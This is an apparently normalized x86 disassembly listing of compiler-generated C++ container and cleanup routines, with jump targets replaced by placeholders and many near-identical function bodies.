call sub_469f30
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_469f80
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_469f80
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_469fd0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_469fd0
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_46a020
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_46a020
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_46a070
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_46a070
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_46a0c0
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_46a0c0
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_46a110
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_46a110
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_46a160
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
mov al [ edi + 0x89 ]
test al al
mov ebx ecx
mov esi edi
jne r-xdata
pop edi
pop esi
pop ebx
retn 0x4
mov eax [ esi + 0x8 ]
push eax
mov ecx ebx
call sub_46a160
mov esi [ esi ]
mov ecx edi
call sub_461ab0
push edi
call j_sub_4b66ed#2
mov al [ esi + 0x89 ]
add esp 0x4
test al al
mov edi esi
je r-xdata
sub_46a1b0
mov eax [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push esi
mov esi [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x1c ]
mov eax esp
mov [ eax ] ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x1c ]
mov [ eax ] edx
mov eax esp
push esi
mov [ eax ] ecx
call sub_465e60
add esp 0x14
mov eax esi
pop esi
retn
sub_46a1f0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0c71
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
nop
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
dec ecx
add esi 0x20
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] ecx
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ edi ]
push 0xffffffff
lea ecx [ esi + 0x4 ]
mov [ esi ] eax
push ebx
lea edx [ edi + 0x4 ]
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push edx
mov [ ecx + 0x4 ] bl
call sub_401dd0
cmp [ ebp + 0xc ] ebx
jbe r-xdata
sub_46a262
mov edi [ ebp - 0x14 ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp edi eax
je r-xdata
push ebx
push ebx
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea esi [ edi + 0x1c ]
mov eax [ ebp + 0x8 ]
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
add edi 0x20
add esi 0x20
cmp edi eax
jne r-xdata
mov eax [ esi - 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
cmp [ esi ] 0x10
jb r-xdata
sub_46a2c0
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0c99
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0xc ] esi
test esi esi
je r-xdata
dec ebx
add esi 0x80
mov [ ebp - 0x4 ] 0x0
mov [ ebp + 0x8 ] esi
jmp r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
test ebx ebx
jbe r-xdata
mov [ esi ] eax
lea eax [ edi + 0x8 ]
push eax
lea ecx [ esi + 0x8 ]
mov [ ebp - 0x4 ] 0x2
call sub_402400
mov ecx [ edi + 0x78 ]
mov [ esi + 0x78 ] ecx
inc [ eax + 0xd48 ]
sub_46a333
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_4b5bd2
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ecx ]
mov ecx esi
call sub_460f30
add esi 0x80
cmp esi edi
jne r-xdata
sub_46a370
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0cb0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push edx
push esi
push ecx
push eax
push edi
mov [ ebp - 0x4 ] 0x0
call sub_453050
add esp 0x14
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_40cc80
test al al
je r-xdata
sub_46a410
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0cc0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push edx
push esi
push ecx
push eax
push edi
mov [ ebp - 0x4 ] 0x0
call sub_453050
add esp 0x14
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_4533c0
test al al
je r-xdata
sub_46a4b0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edx [ edi + 0x4 ]
xor ebx ebx
cmp edx ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov ebp [ edi + 0x8 ]
mov ecx ebp
sub ecx edx
sar ecx 0x2
cmp ecx ebx
jne r-xdata
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
cmp eax ebx
jne r-xdata
mov ebx [ esi + 0x8 ]
sub ebx eax
sar ebx 0x2
xor ebx ebx
jmp r-xdata
test eax eax
jne r-xdata
push eax
push ebp
push edx
call sub_4615b0
mov eax [ edi + 0x4 ]
add esp 0xc
test eax eax
jne r-xdata
cmp ecx ebx
ja r-xdata
mov ebx [ esi + 0xc ]
sub ebx eax
sar ebx 0x2
xor ebx ebx
jmp r-xdata
mov edi [ edi + 0x8 ]
sub edi eax
mov eax [ esi + 0x4 ]
sar edi 0x2
lea ecx [ eax + edi * 4 ]
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x4 ]
xor edi edi
lea ecx [ eax + edi * 4 ]
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
push eax
call j_sub_4b66ed#2
mov ecx [ edi + 0x4 ]
add esp 0x4
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
cmp ecx ebx
ja r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push ecx
push eax
push edi
mov ecx esi
call sub_461590
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_453420
test al al
je r-xdata
push eax
lea ebx [ edx + ecx * 4 ]
push ebx
push edx
call sub_4615b0
mov edx [ esp + 0x20 ]
mov eax [ esi + 0x8 ]
mov edi [ edi + 0x8 ]
push edx
push esi
push eax
push edi
push ebx
call sub_453050
add esp 0x20
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
sub_46a5f0
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
add ecx eax
test cl 0x3
jne r-xdata
mov eax [ esi + 0x8 ]
push ebx
mov ebx [ esi + 0x10 ]
push edi
mov edi [ esi + 0xc ]
add edi ebx
mov ebx edi
shr ebx 0x2
cmp eax ebx
ja r-xdata
mov ecx [ esi + 0x8 ]
add eax 0x4
shr eax 0x2
cmp ecx eax
ja r-xdata
mov edx [ esi + 0x4 ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub ebx eax
push 0x1
mov ecx esi
call sub_467f20
mov edx [ esi + 0x4 ]
mov eax [ edx + ebx * 4 ]
and edi 0x3
lea eax [ eax + edi * 4 ]
test eax eax
pop edi
pop ebx
je r-xdata
push 0x10
call sub_4b573e
mov ecx [ esi + 0x4 ]
add esp 0x4
mov [ ecx + ebx * 4 ] eax
inc [ esi + 0x10 ]
pop esi
retn 0x4
mov ecx [ esp + 0x8 ]
mov edx [ ecx ]
mov [ eax ] edx
sub_46a670
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0cd0
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ edi + 0x4 ]
test ecx ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x14 ] esi
jne r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push edx
push esi
push ecx
push eax
push edi
mov [ ebp - 0x4 ] 0x0
call sub_4616d0
add esp 0x14
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_468050
test al al
je r-xdata
sub_46a710
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov edx [ edi + 0x4 ]
xor ebx ebx
cmp edx ebx
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax ebx
je r-xdata
mov ebp [ edi + 0x8 ]
mov ecx ebp
sub ecx edx
sar ecx 0x2
cmp ecx ebx
jne r-xdata
pop edi
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esi + 0x4 ]
cmp eax ebx
jne r-xdata
mov ebx [ esi + 0x8 ]
sub ebx eax
sar ebx 0x2
xor ebx ebx
jmp r-xdata
test eax eax
jne r-xdata
push eax
push ebp
push edx
call sub_4615b0
mov eax [ edi + 0x4 ]
add esp 0xc
test eax eax
jne r-xdata
cmp ecx ebx
ja r-xdata
mov ebx [ esi + 0xc ]
sub ebx eax
sar ebx 0x2
xor ebx ebx
jmp r-xdata
mov edi [ edi + 0x8 ]
sub edi eax
mov eax [ esi + 0x4 ]
sar edi 0x2
lea ecx [ eax + edi * 4 ]
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax [ esi + 0x4 ]
xor edi edi
lea ecx [ eax + edi * 4 ]
pop edi
mov [ esi + 0x8 ] ecx
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
push eax
call j_sub_4b66ed#2
mov ecx [ edi + 0x4 ]
add esp 0x4
test ecx ecx
jne r-xdata
test eax eax
jne r-xdata
cmp ecx ebx
ja r-xdata
mov eax [ edi + 0x8 ]
sub eax ecx
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx eax
sar ecx 0x2
xor ecx ecx
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ edi + 0x8 ]
mov edi [ edi + 0x4 ]
push ecx
push eax
push edi
mov ecx esi
call sub_461590
mov [ esi + 0x8 ] eax
push eax
mov ecx esi
call sub_41ce10
test al al
je r-xdata
push eax
lea ebx [ edx + ecx * 4 ]
push ebx
push edx
call sub_4615b0
mov edx [ esp + 0x20 ]
mov eax [ esi + 0x8 ]
mov edi [ edi + 0x8 ]
push edx
push esi
push eax
push edi
push ebx
call sub_453050
add esp 0x20
pop edi
mov [ esi + 0x8 ] eax
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
sub_46a850
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
xor edx edx
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax [ esp + 0xc ]
cmp edx eax
jae r-xdata
pop edi
pop esi
retn 0x8
mov edi [ ecx + 0x8 ]
mov edx edi
sub edx esi
cmp eax edx
jae r-xdata
mov edx [ ecx + 0x8 ]
sub edx esi
xor edx edx
jmp r-xdata
push ecx
mov edx esp
mov [ edx ] edi
mov edx [ ecx + 0x4 ]
push ecx
add edx eax
mov esi esp
lea eax [ esp + 0x18 ]
push eax
mov [ esi ] edx
call sub_461a70
sub eax edx
mov edx [ ecx + 0x8 ]
lea esi [ esp + 0x10 ]
push esi
push eax
push ecx
mov eax esp
mov [ eax ] edx
call sub_417cb0
pop edi
pop esi
retn 0x8
sub_46a8c0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn 0x8
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x2
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
push ecx
lea eax [ eax + edx * 4 ]
mov esi esp
lea edx [ esp + 0x14 ]
push edx
mov [ esi ] eax
call sub_420e40
sub edx eax
lea esi [ esp + 0x10 ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ eax ] edx
call sub_453480
pop edi
pop esi
retn 0x8
sub_46a940
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0ce8
push eax
mov [ fs : 0x0 ] esp
push esi
push edi
mov esi [ ecx + 0x4 ]
test esi esi
mov [ esp + 0x10 ] 0x0
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0x18 ]
cmp eax edx
jae r-xdata
mov esi [ esp + 0x1c ]
test esi esi
mov [ esp + 0x10 ] 0xffffffff
je r-xdata
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x2
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x8 ]
pop edi
mov [ fs : 0x0 ] ecx
pop esi
add esp 0xc
retn 0x8
dec [ esi + 0xd48 ]
jne r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
mov [ esp + 0x1c ] esp
push ecx
lea eax [ eax + edx * 4 ]
mov esi esp
lea edx [ esp + 0x20 ]
mov [ esp + 0x20 ] esp
push edx
mov [ esi ] eax
call sub_4653e0
sub edx eax
lea esi [ esp + 0x1c ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ esp + 0x24 ] esp
mov [ eax ] edx
call sub_468120
jmp r-xdata
mov ecx esi
call sub_43fe30
push esi
call j_sub_4b66ed#2
add esp 0x4
sub_46aa20
push ebx
mov ebx ecx
push esi
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
mov [ ebx + 0x4 ] 0x0
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0xc ] 0x0
pop ebx
retn
push edi
mov edi [ ebx + 0x8 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
pop edi
mov ecx esi
call sub_4607d0
add esi 0x20
cmp esi edi
jne r-xdata
sub_46aa70
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn 0x8
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x2
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x2
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
push ecx
lea eax [ eax + edx * 4 ]
mov esi esp
lea edx [ esp + 0x14 ]
push edx
mov [ esi ] eax
call sub_420e40
sub edx eax
lea esi [ esp + 0x10 ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ eax ] edx
call sub_469770
pop edi
pop esi
retn 0x8
sub_46aaf0
push esi
mov esi [ ecx + 0x4 ]
test esi esi
push edi
jne r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov edx [ esp + 0xc ]
cmp eax edx
jae r-xdata
pop edi
pop esi
retn 0xc
mov edi [ ecx + 0x8 ]
mov eax edi
sub eax esi
sar eax 0x3
cmp edx eax
jae r-xdata
mov eax [ ecx + 0x8 ]
sub eax esi
sar eax 0x3
xor eax eax
jmp r-xdata
push ecx
mov eax esp
mov [ eax ] edi
mov eax [ ecx + 0x4 ]
push ecx
lea eax [ eax + edx * 8 ]
mov esi esp
lea edx [ esp + 0x14 ]
push edx
mov [ esi ] eax
call sub_461ba0
sub edx eax
lea esi [ esp + 0x10 ]
push esi
push edx
mov edx [ ecx + 0x8 ]
push ecx
mov eax esp
mov [ eax ] edx
call sub_4693d0
pop edi
pop esi
retn 0xc
sub_46ab70
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi ecx
push edi
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
xor edi edi
jmp r-xdata
mov ecx [ esi + 0x8 ]
sub ecx edi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx esi
mov [ eax ] ebx
call sub_468470
mov ecx [ esi + 0x4 ]
lea eax [ edi + edi * 2 ]
pop edi
lea edx [ ecx + eax * 4 ]
mov eax [ esp + 0xc ]
pop esi
mov [ eax ] edx
pop ebx
retn 0xc
mov ecx ebx
sub ecx edi
mov eax 0x2aaaaaab
imul ecx
sar edx 0x1
mov ecx edx
shr ecx 0x1f
add edx ecx
mov edi edx
sub_46abe0
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
jne r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
mov edi [ esp + 0x10 ]
cmp edx edi
jae r-xdata
pop edi
pop esi
pop ebx
retn 0xe0
mov ebx [ esi + 0x8 ]
mov edx ebx
sub edx ecx
mov eax 0x94f2095
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
cmp edi edx
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x94f2095
imul edx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
imul edi edi 0xdc
add edi ecx
cmp edi ebx
je r-xdata
lea eax [ esp + 0x14 ]
push eax
sub edi edx
push edi
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
mov [ eax ] ecx
mov ecx esi
call sub_468770
pop edi
pop esi
pop ebx
retn 0xe0
push edi
push ecx
mov eax esp
mov [ eax ] ebx
push ecx
mov eax esp
mov [ eax ] ebx
call sub_460530
add esp 0xc
mov [ esi + 0x8 ] eax
sub_46aca0
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
xor esi esi
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx edi
mov [ eax ] ebx
call sub_468770
imul esi esi 0xdc
add esi [ edi + 0x4 ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov ecx ebx
sub ecx esi
mov eax 0x94f2095
imul ecx
sar edx 0x3
mov ecx edx
shr ecx 0x1f
add edx ecx
mov esi edx
sub_46ad10
push ebx
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
push edi
jne r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
mov edi [ esp + 0x10 ]
cmp edx edi
jae r-xdata
pop edi
pop esi
pop ebx
retn 0x1a4
mov ebx [ esi + 0x8 ]
mov edx ebx
sub edx ecx
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
cmp edi edx
jae r-xdata
mov edx [ esi + 0x8 ]
sub edx ecx
mov eax 0x4ec4ec4f
imul edx
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
imul edi edi 0x1a0
add edi ecx
cmp edi ebx
je r-xdata
lea eax [ esp + 0x14 ]
push eax
sub edi edx
push edi
push ecx
mov ecx [ esi + 0x8 ]
mov eax esp
mov [ eax ] ecx
mov ecx esi
call sub_468a90
pop edi
pop esi
pop ebx
retn 0x1a4
push edi
push ecx
mov eax esp
mov [ eax ] ebx
push ecx
mov eax esp
mov [ eax ] ebx
call sub_4605b0
add esp 0xc
mov [ esi + 0x8 ] eax
sub_46add0
push ebx
mov ebx [ esp + 0xc ]
push esi
push edi
mov edi ecx
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
xor esi esi
jmp r-xdata
mov ecx [ edi + 0x8 ]
sub ecx esi
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
mov [ esp + 0x14 ] edx
jne r-xdata
mov edx [ esp + 0x18 ]
push edx
push 0x1
push ecx
mov eax esp
mov ecx edi
mov [ eax ] ebx
call sub_468a90
imul esi esi 0x1a0
add esi [ edi + 0x4 ]
mov eax [ esp + 0x10 ]
pop edi
mov [ eax ] esi
pop esi
pop ebx
retn 0xc
mov ecx ebx
sub ecx esi
mov eax 0x4ec4ec4f
imul ecx
sar edx 0x7
mov ecx edx
shr ecx 0x1f
add edx ecx
mov esi edx
sub_46ae40
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4c0d08
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
push esi
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x7fffffe
jb r-xdata
mov edx [ esp + 0x68 ]
mov eax [ edi + 0x4 ]
mov esi [ esp + 0x64 ]
push ebx
push 0x0
push edx
push eax
push esi
push eax
mov ecx edi
call sub_468db0
mov ebx [ edi + 0x8 ]
mov ecx eax
mov eax [ edi + 0x4 ]
inc ebx
cmp esi eax
mov [ esp + 0x6c ] ecx
mov [ edi + 0x8 ] ebx
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x20 ] 0xf
mov [ esp + 0x1c ] esi
mov [ esp + 0xc ] 0x0
lea edx [ eax + 0x1 ]
mov al [ esp + 0x64 ]
test al al
je r-xdata
mov [ eax + 0x4 ] ecx
mov eax [ edi + 0x4 ]
mov [ eax ] ecx
mov edx [ edi + 0x4 ]
mov [ edx + 0x8 ] ecx
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x10 ]
call sub_401e80
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x28 ]
mov [ esp + 0x58 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x28 ]
push ecx
mov [ esp + 0x2c ] r--data
call sub_4b5bd2
mov [ esi + 0x8 ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax + 0x8 ]
jne r-xdata
mov [ esi ] ecx
mov eax [ edi + 0x4 ]
cmp esi [ eax ]
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x2c ] 0x0
lea eax [ ecx + 0x4 ]
mov esi ecx
mov bl 0x1
jne r-xdata
mov [ eax + 0x8 ] ecx
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x2c ] bl
mov eax [ esp + 0x60 ]
pop ebx
mov [ eax ] ecx
mov ecx [ esp + 0x4c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x50
retn 0x10
push ebp
cmp [ edx + 0x2c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x2c ] 0x0
